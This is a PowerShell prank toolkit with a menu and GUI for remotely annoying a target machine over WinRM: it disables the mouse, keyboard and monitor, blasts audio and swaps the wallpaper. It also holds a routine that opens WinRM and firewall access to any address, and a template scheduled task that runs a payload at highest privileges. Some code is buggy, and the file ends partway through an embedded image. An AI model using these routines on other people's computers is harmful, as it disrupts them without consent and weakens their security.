<#
.SYNOPSIS
    Forked from https://github.com/perplexityjeff/PowerShell-Troll
    https://github.com/Hackstur/JokerShell/blob/master/
    https://github.com/Agunderman10/Powershell-Pranks

    https://lazyadmin.nl/powershell/powershell-gui-howto-get-started/


.DESCRIPTION
    Bunch of joke functions for the everyday scriptkiddie.


.TO-DO
    - Dropdown: executes function on selection
    - Notification: when e.g. Get-AudioLevel is invoked, show out put at the bottom of the window
    - Test on Remote Machine (with WinRM)
    - New-ModuleManifest -Path .\PwshTroll -ModuleVersion "1.0" -Author "thomas@grome.dev"
    - Text Menu: Add function execution confirmation 
    - Remote: Fix PSSession function

    - 3 system modules
    - 30 current modules
    - 18 new modules


cd "C:\Users\tmg\OneDrive - grome.dev\OneDrive\computer-stuff\PowerShell Scripts\PowerShell Pranks\PowerShell-Troll-branch\PwshTrollTools"
Import-Module .\PwshTrollTools.psm1 -verbose

#>

### Index
Function Show-TrollMenu 
{
#.DESCRIPTION Opens a text based menu for PwshTrollTools
Write-Host "`n***************************************************************" -ForegroundColor green -BackgroundColor black
Write-Host "                                                               " -ForegroundColor green -BackgroundColor black
Write-Host "                      PwshTrollTools                           " -ForegroundColor green -BackgroundColor black
Write-Host "                                                               " -ForegroundColor green -BackgroundColor black
Write-Host "***************************************************************`n" -ForegroundColor green -BackgroundColor black

Write-Host "Target machine must have WinRM enabled for remote connections."
Write-Host "Otherwise PwshTrollTools will only be able to run locally.`n"
$confirmPath = {
$Confirm = Read-Host Do you want to make a remote connection? [Y] Yes [N] No 
   if($Confirm -match "[y]") 
       { 
        Connect-Remote
       } 
}
$confirmPath.Invoke()

$Menu = {
    Clear-Host
    Write-Host "0. Connect to Remote Target
1. RickRoll
2. Change Wallpaper
3. Disable Mouse`n"

    Write-Output -InputObject @"
0. Connect to Remote Target
1. RickRoll
2. Change Wallpaper
3. Disable Mouse
"@

[int]$option = Read-Host -Prompt "Please select option"
Switch ($option) {
    0 {Connect-Remote; $Menu.Invoke()}
    1 {Invoke-RickRoll; $Menu.Invoke()}
    2 {Set-Wallpaper; $Menu.Invoke()};
    3 {Disable-Mouse; $Menu.Invoke()};
    default {$Menu.Invoke()}
    }
}
$Menu.Invoke()
} 

Function Show-TrollMenuGUI
{
#.DESCRIPTION Opens a GUI menu for PwshTrollTools
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
[System.Windows.Forms.Application]::EnableVisualStyles()
$form.Size = New-Object System.Drawing.Size(1250,550)
$form.StartPosition = 'CenterScreen'
$form.text = "PowerShell Troll"


$button_click0 = {Connect-Remote}
$Button0 = New-Object System.Windows.Forms.Button
$Button0.Location = New-Object System.Drawing.Size(350,50)
$Button0.Size = New-Object System.Drawing.Size(500,35)
$Button0.Text = "Who's the unlucky guy?"
$Button0.Add_Click($Button_Click0)

#First column
$button_click1 = {Invoke-RickRoll}
$Button1 = New-Object System.Windows.Forms.Button
$Button1.Location = New-Object System.Drawing.Size(50,150)
$Button1.Size = New-Object System.Drawing.Size(200,35)
$Button1.Text = "RickRoll"
$Button1.Add_Click($Button_Click1)


$button_click2 = {Set-Wallpaper}
$Button2 = New-Object System.Windows.Forms.Button
$Button2.Location = New-Object System.Drawing.Size(50,200)
$Button2.Size = New-Object System.Drawing.Size(200,35)
$Button2.Text = "Change Wallpaper"
$Button2.Add_Click($Button_Click2)


$button_click3 = {Disable-Mouse}
$Button3 = New-Object System.Windows.Forms.Button
$Button3.Location = New-Object System.Drawing.Size(50,250)
$Button3.Size = New-Object System.Drawing.Size(200,35)
$Button3.Text = "Disable Mouse"
$Button3.Add_Click($Button_Click3)


$button_click4 = {Enable-Mouse}
$Button4 = New-Object System.Windows.Forms.Button
$Button4.Location = New-Object System.Drawing.Size(50,300)
$Button4.Size = New-Object System.Drawing.Size(200,35)
$Button4.Text = "Enable Mouse"
$Button4.Add_Click($Button_Click4)


$button_click5 = {Disable-Keyboard}
$Button5 = New-Object System.Windows.Forms.Button
$Button5.Location = New-Object System.Drawing.Size(50,350)
$Button5.Size = New-Object System.Drawing.Size(200,35)
$Button5.Text = "Disable Keyboard"
$Button5.Add_Click($Button_Click5)

$button_click6 = {Enable-Keyboard}
$Button6 = New-Object System.Windows.Forms.Button
$Button6.Location = New-Object System.Drawing.Size(50,400)
$Button6.Size = New-Object System.Drawing.Size(200,35)
$Button6.Text = "Enable Keyboard"
$Button6.Add_Click($Button_Click6)


#Second column
$button_click7 = {Set-AudioMute}
$Button7 = New-Object System.Windows.Forms.Button
$Button7.Location = New-Object System.Drawing.Size(350,150)
$Button7.Size = New-Object System.Drawing.Size(200,35)
$Button7.Text = "Mute Audio"
$Button7.Add_Click($Button_Click7)


$button_click8 = {Set-AudioUnmute}
$Button8 = New-Object System.Windows.Forms.Button
$Button8.Location = New-Object System.Drawing.Size(350,200)
$Button8.Size = New-Object System.Drawing.Size(200,35)
$Button8.Text = "Unmute Audio"
$Button8.Add_Click($Button_Click8)


$button_click9 = {Set-AudioMin}
$Button9 = New-Object System.Windows.Forms.Button
$Button9.Location = New-Object System.Drawing.Size(350,250)
$Button9.Size = New-Object System.Drawing.Size(200,35)
$Button9.Text = "Min Volume"
$Button9.Add_Click($Button_Click9)


$button_click10 = {Set-AudioMax}
$Button10 = New-Object System.Windows.Forms.Button
$Button10.Location = New-Object System.Drawing.Size(350,300)
$Button10.Size = New-Object System.Drawing.Size(200,35)
$Button10.Text = "Max Volume"
$Button10.Add_Click($Button_Click10)


$button_click11 = {Get-AudioLevel}
$Button11 = New-Object System.Windows.Forms.Button
$Button11.Location = New-Object System.Drawing.Size(350,350)
$Button11.Size = New-Object System.Drawing.Size(200,35)
$Button11.Text = "See Current Volume"
$Button11.Add_Click($Button_Click11)


$button_click12 = {Invoke-AudioFile}
$Button12 = New-Object System.Windows.Forms.Button
$Button12.Location = New-Object System.Drawing.Size(350,400)
$Button12.Size = New-Object System.Drawing.Size(200,35)
$Button12.Text = "Send Audio File"
$Button12.Add_Click($Button_Click12)


#Third column
$button_click13 = {Send-Message}
$Button13 = New-Object System.Windows.Forms.Button
$Button13.Location = New-Object System.Drawing.Size(650,150)
$Button13.Size = New-Object System.Drawing.Size(200,35)
$Button13.Text = "Send a Message"
$Button13.Add_Click($Button_Click13)


$button_click14 = {Invoke-CatFact}
$Button14 = New-Object System.Windows.Forms.Button
$Button14.Location = New-Object System.Drawing.Size(650,200)
$Button14.Size = New-Object System.Drawing.Size(200,35)
$Button14.Text = "Cat Facts"
$Button14.Add_Click($Button_Click14)


$button_click15 = {Invoke-DadJoke}
$Button15 = New-Object System.Windows.Forms.Button
$Button15.Location = New-Object System.Drawing.Size(650,250)
$Button15.Size = New-Object System.Drawing.Size(200,35)
$Button15.Text = "Dad Joke"
$Button15.Add_Click($Button_Click15)


<#
#dropdown
$DropDownSounds = New-Object system.Windows.Forms.ComboBox
$DropDownSounds.Location = New-Object System.Drawing.Size(650,300)
$DropDownSounds.Size = New-Object System.Drawing.Size(200)
$DropDownSounds.Text = ""
$DropDownSounds.Font= 'Microsoft Sans Serif,14'

@('Annoying Sounds','Annoying Chime','Annoying Alarm') | ForEach-Object {[void] $DropDownSounds.Items.Add($_)}
$DropDownSounds.Text = "Annoying Sounds"
$DropDownSounds.Font= 'Microsoft Sans Serif,14'
# Select the default value
$DropDownSounds.SelectedIndex       = 0
$DropDownSounds.location            = New-Object System.Drawing.Point(650,300)
$DropDownSounds.Font= 'Microsoft Sans Serif,14'
#>

$button_click16 = {Invoke-NotificationSoundSpam}
$Button16 = New-Object System.Windows.Forms.Button
$Button16.Location = New-Object System.Drawing.Size(650,300)
$Button16.Size = New-Object System.Drawing.Size(200,35)
$Button16.Text = "Annoying Chime"
$Button16.Add_Click($Button_Click16)


$button_click17 = {Invoke-Alarm}
$Button17 = New-Object System.Windows.Forms.Button
$Button17.Location = New-Object System.Drawing.Size(650,350)
$Button17.Size = New-Object System.Drawing.Size(200,35)
$Button17.Text = "Annoying Alarm"
$Button17.Add_Click($Button_Click17)


$button_click18 = {Invoke-VoiceMessage}
$Button18 = New-Object System.Windows.Forms.Button
$Button18.Location = New-Object System.Drawing.Size(650,400)
$Button18.Size = New-Object System.Drawing.Size(200,35)
$Button18.Text = "Send Voice Msg"
$Button18.Add_Click($Button_Click18)



#Fourth column
$button_click19 = {Get-Trivia}
$Button19 = New-Object System.Windows.Forms.Button
$Button19.Location = New-Object System.Drawing.Size(950,150)
$Button19.Size = New-Object System.Drawing.Size(200,35)
$Button19.Text = "Trivia Questions"
$Button19.Add_Click($Button_Click19)


$button_click20 = {Invoke-99BottlesOfBeer}
$Button20 = New-Object System.Windows.Forms.Button
$Button20.Location = New-Object System.Drawing.Size(950,200)
$Button20.Size = New-Object System.Drawing.Size(200,35)
$Button20.Text = "99 Bottles"
$Button20.Add_Click($Button_Click20)


$button_click21 = {Invoke-HappyBirthday}
$Button21 = New-Object System.Windows.Forms.Button
$Button21.Location = New-Object System.Drawing.Size(950,250)
$Button21.Size = New-Object System.Drawing.Size(200,35)
$Button21.Text = "Happy Birthday!"
$Button21.Add_Click($Button_Click21)


$button_click22 = {Invoke-Tetris}
$Button22 = New-Object System.Windows.Forms.Button
$Button22.Location = New-Object System.Drawing.Size(950,300)
$Button22.Size = New-Object System.Drawing.Size(200,35)
$Button22.Text = "Dah Da Da Dah"
$Button22.Add_Click($Button_Click22)


$button_click23 = {Invoke-SuperMario}
$Button23 = New-Object System.Windows.Forms.Button
$Button23.Location = New-Object System.Drawing.Size(950,350)
$Button23.Size = New-Object System.Drawing.Size(200,35)
$Button23.Text = "It's a me..."
$Button23.Add_Click($Button_Click23)


$button_click24 = {Invoke-RowBoat}
$Button24 = New-Object System.Windows.Forms.Button
$Button24.Location = New-Object System.Drawing.Size(950,400)
$Button24.Size = New-Object System.Drawing.Size(200,35)
$Button24.Text = "Row, Row, Row"
$Button24.Add_Click($Button_Click24)


# Add buttons to GUI
#$Form.Controls.Add($DropDownSounds)

$Form.Controls.Add($Button0)

$Form.Controls.Add($Button1)
$Form.Controls.Add($Button2)
$Form.Controls.Add($Button3)
$Form.Controls.Add($Button4)
$Form.Controls.Add($Button5)
$Form.Controls.Add($Button6)

$Form.Controls.Add($Button7)
$Form.Controls.Add($Button8)
$Form.Controls.Add($Button9)
$Form.Controls.Add($Button10)
$Form.Controls.Add($Button11)
$Form.Controls.Add($Button12)

$Form.Controls.Add($Button13)
$Form.Controls.Add($Button14)
$Form.Controls.Add($Button15)
$Form.Controls.Add($Button16)
$Form.Controls.Add($Button17)
$Form.Controls.Add($Button18)

$Form.Controls.Add($Button19)
$Form.Controls.Add($Button20)
$Form.Controls.Add($Button21)
$Form.Controls.Add($Button22)
$Form.Controls.Add($Button23)
$Form.Controls.Add($Button24)

$form.showdialog()
}

function Enable-Remoting
{
#.DESCRIPTION This needs to be run locally on the target machine to enable remote connections.
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') {
    While (1) 
        { 
            Set-Service -Name "WinRM" -StartupType Automatic -Status Running
        #Uncomment below and run on management machine if you want to connect to target using IP
            #Set-Item wsman:\localhost\Client\TrustedHosts -value 172.22.8.253
            #Restart-Service WinRM

        #Uncomment to configure https transport on target
            Set-Service -Name "WinRM" -StartupType Automatic -Status Running
            $Cert = New-SelfSignedCertificate -CertstoreLocation Cert:\LocalMachine\My -DnsName "172.22.8.253"
            $cert.Thumbprint
            New-Item -Path WSMan:\LocalHost\Listener -Transport HTTPS -Address * -CertificateThumbPrint $Cert.Thumbprint –Force
            New-NetFirewallRule -DisplayName "Windows Remote Management (HTTPS-In)" -Name "Windows Remote Management (HTTPS-In)" -Profile Any -LocalPort 5986 -Protocol TCP
            Enable-PSRemoting
            <#
            Enable-PSRemoting
            winrm quickconfig
            #winrm quickconfig -transport:https
            Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress Any
            Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-NoScope" -RemoteAddress Any
            Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
            #>
        }     
    }
}

Function Connect-Remote
{
    $ComputerName = "172.22.8.253"
    $creds = Get-Credential
    Enter-PSSession -ComputerName $ComputerName -Credential $creds
}

Function Start-AudioControl
{
Add-Type -TypeDefinition '
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'
}


### System
function Send-Message 
{
.AUTHOR
    $Message = Read-Host "Boo! Type your message"
    msg.exe * $Message
}

function Restart-Explorer
{
    Stop-Process -Name "explorer" -force
}

Function Send-VoiceMessage([string]$customVoiceMessage)
{
    $customVoiceMessage = Read-Host "Type your message here"
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($customVoiceMessage)
}

Function Send-AudioFile
{
    Param(
        [parameter(Mandatory=$true)]
        [string]$URL
    )

    if(Test-Path "DownloadedWAVFile.wav")
    {
        Remove-Item "DownloadedWAVFile.wav" -Force
    }

    Invoke-WebRequest -Uri $URL -OutFile "DownloadedWAVFile.wav"

    $filepath = ((Get-Childitem "DownloadedWAVFile.wav").FullName)

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();
}

Function Invoke-NotificationSoundSpam
{
    param
    (
        [Parameter()][int]$Interval = 4
    )

    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
}

Function Invoke-ScheduledTask
{
    $Payload = "foo.ps1"
    $Time = "9:15 AM"
    $UserID = "DOMAIN\user"
    $TaskName = "baz"

    $actions = (New-ScheduledTaskAction -Execute $Payload)
    $trigger = New-ScheduledTaskTrigger -Daily -At $Time
    $principal = New-ScheduledTaskPrincipal -UserId $UserID -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
    $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
    Register-ScheduledTask $Name -InputObject $task
}


### Hardware
Function Set-AudioMax 
{
    Start-AudioControl
    [audio]::Volume = 1
}

Function Set-AudioMin 
{
    Start-AudioControl
    [audio]::Volume = 0
}

Function Get-AudioLevel 
{
   Start-AudioControl
   [audio]::Volume
}

Function Set-AudioLevel 
{
    Param(
        [parameter(Mandatory=$true)]
        [ValidateRange(0,1)]
        [double]$AudioLevel
    )

    Start-AudioControl
    [audio]::Volume = $AudioLevel
}

Function Set-AudioUnmute 
{
    Start-AudioControl
    [Audio]::Mute = $false
}

Function Set-AudioMute 
{
    Start-AudioControl
    [Audio]::Mute = $true
}

Function Disable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
}

Function Enable-Mouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
}

Function Disable-Keyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
}

Function Enable-Keyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
}

Function Invoke-OpenCDDrive
{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Eject()
}

Function Invoke-CloseCDDrive
{
    Add-Type -TypeDefinition  @'
    using System;
    using System.Runtime.InteropServices;
    using System.ComponentModel;
     
    namespace CDROM
    {
        public class Commands
        {
            [DllImport("winmm.dll")]
            static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
     
            public static void Eject()
            {
                 string rt = "";
                 mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
            }
     
            public static void Close()
            {
                 string rt = "";
                 mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
            }
        }
    }  
'@

[CDROM.Commands]::Close()
}

function Set-RotateDisplay
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $WScript = New-Object -com wscript.shell;
    $WScript.SendKeys("^%{LEFT}")
}

function Disable-Monitor
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    (Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
}


### Freak-outs
function Set-WallPaperHasselhoff
{
#.AUTHOR https://github.com/Hackstur/
# Embed image file (hasselhoff.jpg)
$b64='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